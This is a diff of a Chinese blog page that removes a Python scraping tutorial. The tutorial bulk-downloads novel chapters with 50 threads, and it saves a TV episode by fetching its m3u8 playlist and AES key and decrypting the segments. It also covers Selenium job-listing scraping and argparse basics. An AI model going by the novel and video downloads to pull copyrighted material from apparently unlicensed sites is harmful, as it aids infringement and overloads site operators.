class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getbook</span>(<span class="params">url,page</span>):<span class="comment">#先写抓取某一页的函数</span></span><br><span class="line">    res = requests.get(url,headers=headers).content.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    tree = etree.HTML(res)</span><br><span class="line">    content = tree.xpath(<span class="string">&#x27;//*[@id=&quot;content&quot;]/p/text()&#x27;</span>)</span><br><span class="line">    novel = <span class="built_in">str</span>(content).replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;[&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;]&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;,&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">f&#x27;e:\\test\\<span class="subst">&#123;page&#125;</span>.txt&#x27;</span>,mode=<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    f.write(novel)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># for i in range(1,2):                    #效率低下</span></span><br><span class="line">    <span class="comment">#     url = f&#x27;http://www.doupo321.com/doupocangqiong/&#123;i&#125;.html&#x27;</span></span><br><span class="line">    <span class="comment">#     getbook(url,page=i)</span></span><br><span class="line">    <span class="keyword">with</span> ThreadPoolExecutor(<span class="number">50</span>) <span class="keyword">as</span> t:<span class="comment">#开辟50个线程为线程池</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">200</span>):<span class="comment">#获取200章</span></span><br><span class="line">            t.submit(getbook,url=<span class="string">f&#x27;http://www.doupo321.com/doupocangqiong/<span class="subst">&#123;i&#125;</span>.html&#x27;</span>,page=i)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;done&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="案例：抓取美剧网勿言推理视频的第一集">1.6.2. 案例：抓取美剧网勿言推理视频的第一集</h3><p>[勿言推理第一集]: <a target="_blank" rel="noopener" href="http://www.meijuwang.cc/w/wuyantuili-1-1.html">http://www.meijuwang.cc/w/wuyantuili-1-1.html</a>	“视频链接”</p>
-<hr>
-<ul>
-<li><input checked disabled type="checkbox"> #1、找到m3u8文件</li>
-<li><input checked disabled type="checkbox"> #2、通过m3u8下载到ts文件</li>
-<li><input checked disabled type="checkbox"> #3、获取密钥进行解密ts文件</li>
-<li><input checked disabled type="checkbox"> #4、把ts文件合并为一个mp4文件</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="comment">#1、查看页面源码找到视频信息，用正则将需要的视频框架取出</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">iframe</span>(<span class="params">url</span>):</span><br><span class="line">    resp = requests.get(url, headers=headers)</span><br><span class="line">    obj = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&quot;link_pre&quot;:&quot;&quot;,&quot;url&quot;:&quot;(?P&lt;url&gt;.*?)&quot;,&quot;url_next&#x27;</span>, re.S)</span><br><span class="line">    result = obj.search(resp.text).group(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">    result = result.replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    resp.close()</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment">#2、找到m3u8文件正确的下载地址</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">m3u8</span>(<span class="params">url</span>):</span><br><span class="line">    resp = requests.get(url,headers=headers).content.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    spl_url = url.split(<span class="string">&#x27;/share&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    obj = re.<span class="built_in">compile</span>(<span class="string">r&#x27;url&quot;:&quot;(?P&lt;m3u8_link&gt;.*?)&quot;&#125;]&#x27;</span>,re.S)</span><br><span class="line">    result = obj.search(resp).group(<span class="string">&#x27;m3u8_link&#x27;</span>)</span><br><span class="line">    resp.close()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;<span class="subst">&#123;spl_url&#125;</span><span class="subst">&#123;result&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#3、获取m3u8</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_m3u8</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="comment"># 下载m3u8文件，执行完一次后注释</span></span><br><span class="line">    resp = requests.get(url, headers=headers)</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;勿言推理1.m3u8&#x27;</span>, mode=<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    f.write(resp.content)</span><br><span class="line">    resp.close()</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&#x27;http://www.meijuwang.cc/w/wuyantuili-1-1.html&#x27;</span></span><br><span class="line">    if_url = iframe(url=url)</span><br><span class="line">    m3u8_link = m3u8(url=if_url)</span><br><span class="line">    get_m3u8(url=m3u8_link)</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#4、下载ts文件</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">ts_line = []</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_ts</span>():<span class="comment">#下载加密的ts片段</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;勿言推理1.m3u8&#x27;</span>,mode=<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    lines = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="keyword">if</span> line.startswith(<span class="string">&#x27;#&#x27;</span>) <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">            line = line.strip()</span><br><span class="line">            ts_line.append(line)</span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ts_line)):</span><br><span class="line">        resp = requests.get(url=ts_line[i])</span><br><span class="line">        f1 = <span class="built_in">open</span>(<span class="string">f&#x27;video\\<span class="subst">&#123;i&#125;</span>.ts&#x27;</span>,mode=<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">        f1.write(resp.content)</span><br><span class="line">        f1.close()</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    download_ts()</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#5、获取key并解密ts文件</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES<span class="comment">#找到python3的安装目录下的Lib—-site-package将crypto文件夹改名为Crypto</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_key</span>():</span><br><span class="line">    obj = re.<span class="built_in">compile</span>(<span class="string">&#x27;URI=&quot;(?P&lt;key&gt;.*?)&quot;&#x27;</span>)</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;勿言推理1.m3u8&#x27;</span>,mode=<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    lines = f.read()</span><br><span class="line">    keys = obj.search(lines).group(<span class="string">&#x27;key&#x27;</span>)</span><br><span class="line">    resp = requests.get(url=keys).text</span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dec_ts</span>(<span class="params">key</span>):<span class="comment">#将所有片段进行解密</span></span><br><span class="line">    aes = AES.new(key=key.encode(<span class="string">&#x27;utf-8&#x27;</span>), IV=<span class="string">b&#x27;0000000000000000&#x27;</span>, mode=AES.MODE_CBC)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ts_line)):</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">f&#x27;video\\<span class="subst">&#123;i&#125;</span>.ts&#x27;</span>, mode=<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">        f1 = <span class="built_in">open</span>(<span class="string">f&#x27;video2\\<span class="subst">&#123;i&#125;</span>.ts&#x27;</span>, mode=<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">        no_dec = f.read()</span><br><span class="line">        f1.write(aes.decrypt(no_dec))</span><br><span class="line">        f.close()</span><br><span class="line">        f1.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    key1 = get_key()</span><br><span class="line">    dec_ts(key=key1)</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#6、将所有ts文件合并为一个mp4视频</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    os.system(<span class="string">f&#x27;copy /b e:\\python\\爬虫\\5、多线程\\video2\\* e:\\movie.mp4&#x27;</span>)<span class="comment">#将e:\\python\\爬虫\\5、多线程\\video2\\该目录下的所有视频合并为e盘下的movie.mp4</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="Selenium">1.7. Selenium</h2><h3 id="基础介绍-6">1.7.1. 基础介绍</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">优点：</span><br><span class="line">1、使用更加方便，不用处理信息解密步骤以及框架嵌套等</span><br><span class="line">selenium的缺点：</span><br><span class="line">1、如果网站加载过慢会报错，需要借助time.sleep()函数来延迟程序执行</span><br><span class="line">2、浏览器有受自动化测试工具控制的标识，有些网站会以此为标准做反爬</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">环境搭建</span><br><span class="line">1、下载浏览器驱动：http://chromedriver.storage.googleapis.com/index.html  对应的浏览器版本对不上就找最近的一个</span><br><span class="line">2、把解压缩的浏览器驱动放到python解释器下，pycharm右键运行，下面第一行有解释器所在目录</span><br></pre></td></tr></table></figure>
-
-<h3 id="案例：抓取拉勾网职位信息">1.7.2. 案例：抓取拉勾网职位信息</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver <span class="keyword">import</span> Chrome</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">web = Chrome()<span class="comment">#1、创建浏览器对象</span></span><br><span class="line">web.get(<span class="string">&#x27;https://www.lagou.com/&#x27;</span>)<span class="comment">#2、打开浏览器</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">el = web.find_element(By.XPATH,<span class="string">&#x27;//*[@id=&quot;changeCityBox&quot;]/ul/li[1]/a&#x27;</span>)<span class="comment">#新语法，找到按钮的xpath</span></span><br><span class="line">el.click()<span class="comment">#鼠标单击事件</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">web.find_element(By.XPATH,<span class="string">&#x27;//*[@id=&quot;search_input&quot;]&#x27;</span>).send_keys(<span class="string">&quot;python&quot;</span>,Keys.ENTER)<span class="comment">#在文本框输入python并回车</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">jobs = web.find_elements(By.CLASS_NAME,<span class="string">&#x27;item__10RTO&#x27;</span>)<span class="comment">#检索类名为item__10RTO的块</span></span><br><span class="line"><span class="keyword">for</span> job <span class="keyword">in</span> jobs:</span><br><span class="line">    job_name = job.find_element(By.TAG_NAME,<span class="string">&#x27;a&#x27;</span>).text<span class="comment">#遍历工作名称</span></span><br><span class="line">    pay = job.find_element(By.CLASS_NAME,<span class="string">&#x27;money__3Lkgq&#x27;</span>).text<span class="comment">#遍历工作薪资</span></span><br><span class="line">    company = job.find_element(By.CLASS_NAME,<span class="string">&#x27;company-name__2-SjF&#x27;</span>).text<span class="comment">#遍历公司名称</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;岗位名称：<span class="subst">&#123;job_name&#125;</span>，工资为：<span class="subst">&#123;pay&#125;</span>，公司名称：<span class="subst">&#123;company&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<h3 id="窗口切换">1.7.3. 窗口切换</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver <span class="keyword">import</span> Chrome</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">web = Chrome()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#窗口切换</span></span><br><span class="line">web.get(<span class="string">&#x27;https://www.lagou.com/&#x27;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">web.find_element(By.XPATH,<span class="string">&#x27;//*[@id=&quot;changeCityBox&quot;]/ul/li[3]/a&#x27;</span>).click()</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">web.find_element(By.XPATH,<span class="string">&#x27;//*[@id=&quot;search_input&quot;]&#x27;</span>).send_keys(<span class="string">&#x27;python&#x27;</span>,Keys.ENTER)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">web.find_element(By.XPATH,<span class="string">&#x27;//*[@id=&quot;jobList&quot;]/div[1]/div[2]/div[1]/div[1]/div[1]/a&#x27;</span>).click()</span><br><span class="line"><span class="comment">#在selenium眼中，新窗口是不会切换过来的</span></span><br><span class="line">web.switch_to.window(web.window_handles[-<span class="number">1</span>])<span class="comment">#切换语句</span></span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="comment">#iframe之间的切换</span></span><br><span class="line">web.get(<span class="string">&#x27;http://www.meijuwang.cc/w/zuozuomuyugongye-1-1.html&#x27;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">iframe = web.find_element(By.XPATH,<span class="string">&#x27;//*[@id=&quot;playleft&quot;]/iframe&#x27;</span>)<span class="comment">#获取iframe定位</span></span><br><span class="line">web.switch_to.frame(iframe)<span class="comment">#将窗口视角切换到iframe</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#web.switch_to.default_content()#切换回默认的主界面</span></span><br><span class="line">tx = web.find_element(By.XPATH,<span class="string">&#x27;//*[@id=&quot;mvideo&quot;]/div[6]/div[1]/a&#x27;</span>).text</span><br></pre></td></tr></table></figure>
-
-<h2 id="处理命令行参数">1.8. 处理命令行参数</h2><h3 id="sys">1.8.1. sys</h3><h4 id="使用方法">1.8.1.1. 使用方法:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.sys.argv[n]	n&gt;=0</span><br></pre></td></tr></table></figure>
-
-<h4 id="实例">1.8.1.2. 实例:</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="built_in">print</span>(sys.argv[<span class="number">0</span>])	<span class="comment">#	打印自身</span></span><br><span class="line"><span class="built_in">print</span>(sys.argv[<span class="number">1</span>])	<span class="comment">#	输出参数1</span></span><br><span class="line"><span class="built_in">print</span>(sys.argv[<span class="number">2</span>])	<span class="comment">#	输出参数2</span></span><br><span class="line">-----------------------------------------------------------------------------------------</span><br><span class="line">PS D:\测试&gt;python3 .\test.py <span class="number">1</span> <span class="number">2</span></span><br><span class="line">.\test.py</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="argparse">1.8.2. argparse</h3><h4 id="使用方法-1">1.8.2.1. 使用方法:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1. import argparse # 导入模块</span><br><span class="line">2. parse = argparse.ArgumentParser() # 创建对象</span><br><span class="line">3. parse.add_argument() # 添加参数</span><br><span class="line"></span><br><span class="line">    # add_argument</span><br><span class="line">    #     name: 参数名称</span><br><span class="line">    #     narg:</span><br><span class="line">    #           “+” 代表至少一个参数</span><br><span class="line">    #           &quot;*&quot; 代表0个或所有</span><br><span class="line">    #           &quot;?&quot; 代表0个或至少一个参数</span><br><span class="line">    #     type: 参数类型</span><br><span class="line">    #           str 字符类型</span><br><span class="line">    #           int 整型</span><br><span class="line">    #           ...</span><br><span class="line">    #     default: 默认值</span><br><span class="line">    #     help: 显示帮助信息</span><br><span class="line">    #     dest: 后续对象调用参数的名称</span><br><span class="line">    </span><br><span class="line">4. parse.parse_args() # 解析参数</span><br></pre></td></tr></table></figure>
-
-<h4 id="实例-1">1.8.2.2. 实例:</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    parse = argparse.ArgumentParser()   <span class="comment"># 创建ArgumentParser对象</span></span><br><span class="line">    </span><br><span class="line">    parse.add_argument(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--url&quot;</span>, nargs=<span class="string">&quot;?&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Set URL&quot;</span>, dest=<span class="string">&quot;url&quot;</span>)    <span class="comment"># 增加参数1</span></span><br><span class="line">    parse.add_argument(<span class="string">&quot;-o&quot;</span>, <span class="string">&quot;--output&quot;</span>, nargs=<span class="string">&quot;?&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Set output file&quot;</span>, dest=<span class="string">&quot;output&quot;</span>)    <span class="comment"># 增加参数2 ...</span></span><br><span class="line"></span><br><span class="line">    arg = parse.parse_args()  <span class="comment"># 解析参数</span></span><br><span class="line">    <span class="keyword">return</span> arg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parse = test()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;URL链接为:<span class="subst">&#123;parse.url&#125;</span>\n输出文件目录为:<span class="subst">&#123;parse.output&#125;</span>&quot;</span>)</span><br><span class="line">-----------------------------------------------------------------------------------------</span><br><span class="line">PS E:\python&gt; python3 .\Argparse.py -u https://www.baidu.com -o C://desktop</span><br><span class="line">URL链接为:https://www.baidu.com</span><br><span class="line">输出文件目录为:C://desktop</span><br><span class="line">PS E:\python&gt;</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/4/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span>
+    <a class="extend prev" rel="prev" href="/page/4/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/6/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -1141,20 +1382,15 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">47</span>
+          <span class="site-state-item-count">51</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-count">18</span>
         <span class="site-state-item-name">分类</span></a>
-      </div>
-      <div class="site-state-item site-state-tags">
-            <a href="/tags/">
-        <span class="site-state-item-count">1</span>
-        <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
 </div>
